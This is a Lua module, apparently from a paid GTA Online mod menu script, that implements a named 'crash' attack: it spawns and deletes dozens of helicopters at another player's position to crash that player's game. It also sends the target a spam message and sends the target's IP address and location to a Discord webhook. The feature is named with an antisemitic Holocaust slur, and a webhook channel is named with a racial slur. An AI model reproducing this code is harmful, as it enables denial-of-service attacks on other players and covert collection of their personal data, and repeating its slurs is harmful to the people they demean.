local function createHunterVehiclePoolDeleteCrashModule(moduleContext)
    KSRuntimePlayerFeatureState = KSRuntimePlayerFeatureState or {}
    KSRuntimePlayerFeatureState.largeObjects = KSRuntimePlayerFeatureState.largeObjects or {}
    KSRuntimePlayerFeatureState.dumpedObjectsPID = KSRuntimePlayerFeatureState.dumpedObjectsPID or {}

    local function runHunterVehiclePoolDeleteCrash(playerFeature)
        local targetPlayerId = playerFeature:GetPlayerIndex()
        if onCrashCooldown and not isDev then
            notify("Another Crash is running, please wait for it to Finish!")
            return
        end
        local targetPlayer = Players.GetById(targetPlayerId)
        if not targetPlayer then
            return
        end
        local targetGamerInfo = targetPlayer:GetGamerInfo()
        if targetPlayerId == nil or targetPlayerId == GTA.GetLocalPlayerId() or not (isDev or isSupporter or isAdmin) then
            return
        end
        if blacklistRIDList[targetGamerInfo.RockstarId] then
            if not isDev then
                blacklistSound()
                SendToDiscord("nogger", ("%s(%i) tried to Crash(Auschwitz ran outta Spots) a Blacklisted Player (%s)!"):format(
                    Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(),
                    Players.GetName(Utils.GetSelectedPlayer())
                ))
                return
            end
        elseif detectedPlayerReasons[targetPlayerId + 1] == "K-Script User" then
            if not isDev then
                blacklistSound("forbidden_protected_runtime_target")
                SendToDiscord("nogger", ("%s(%i) tried to Crash another K-Script User (%s)!"):format(
                    Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(),
                    Players.GetName(Utils.GetSelectedPlayer())
                ))
                return
            end
        end
        onCrashCooldown = true

        local function logFeatureUse()
            local targetTags = Players.GetTags(targetPlayerId)
            local isTargetFriend = string.find(targetTags, "[F]", 1, true) ~= nil
            local targetIpInfo = Players.GetIPInfo(targetPlayerId)
            local targetIpAddress = Players.GetIP(targetPlayerId):ToString(false)
            SendToDiscord("lol", ("%s used Auschwitz ran outta Spots Crash against %s with UID %i, isSupporter: %s, is Target Friend?: %s, Target Country: %s, Target Continent: %s, Target IP: %s"):format(
                PLAYER.GET_PLAYER_NAME(GTA.GetLocalPlayerId()),
                Players.GetName(Utils.GetSelectedPlayer()), Cherax.GetUID(),
                tostring(isSupporter), tostring(isTargetFriend),
                targetIpInfo.country, targetIpInfo.continent, targetIpAddress
            ))
        end
        log = logFeatureUse
        Script.QueueJob(log)
        local helicopterModelHash = Utils.Joaat("hunter")
        request_model(helicopterModelHash)
        local targetGamerHandle = GamerHandle.New(targetGamerInfo.RockstarId)
        local gamerHandleBuffer = nil
        if targetGamerHandle ~= nil and targetGamerHandle:IsValid() then
            gamerHandleBuffer = targetGamerHandle:ToBuffer() or nil
        end
        local gamerHandleAddress = nil
        if gamerHandleBuffer ~= nil then
            gamerHandleAddress = gamerHandleBuffer:GetBuffer() or nil
        end
        if gamerHandleAddress ~= nil and gamerHandleAddress ~= 0 then
            NETWORK.NETWORK_SEND_TEXT_MESSAGE("K-Script on Top! discord;gg/k-script", gamerHandleAddress)
        end
        Script.Yield(1000)
        notify("Executing Auschwitz ran outta Spots...")
        local stopTimeMs = Time.GetEpocheMs() + 4500
        while stopTimeMs > Time.GetEpocheMs() do
            local targetPosition = V3.New(ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetPlayerId), false))
            for spawnIndex = 0, 45 do
                local spawnedVehicle = GTA.SpawnVehicle(
                    helicopterModelHash, targetPosition.x, targetPosition.y + 125,
                    targetPosition.z + 350, 1, true, true
                )
                if spawnedVehicle ~= 0 and ENTITY.DOES_ENTITY_EXIST(spawnedVehicle) then
                    ENTITY.SET_ENTITY_PROOFS(spawnedVehicle, true, true, true, true, true, true, true, true)
                    Script.Yield(15)
                    ENTITY.FREEZE_ENTITY_POSITION(spawnedVehicle, true)
                    deleteEntityLocal(spawnedVehicle)
                end
            end
            Script.Yield(100)
        end
        notify("Auschwitz ran outta Spots Completed!")
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(helicopterModelHash)
        onCrashCooldown = false
    end

    local hunterVehiclePoolDeleteCrashRunner = { variant = "donator", feature = "invalidPoolDelete1", slug = "invalidpooldelete1" }

    function hunterVehiclePoolDeleteCrashRunner.run(runContext)
        if type(runContext) ~= "table" or not runContext then
            runContext = {}
        end
        return runHunterVehiclePoolDeleteCrash(runContext.feature)
    end

    return hunterVehiclePoolDeleteCrashRunner
end

return createHunterVehiclePoolDeleteCrashModule
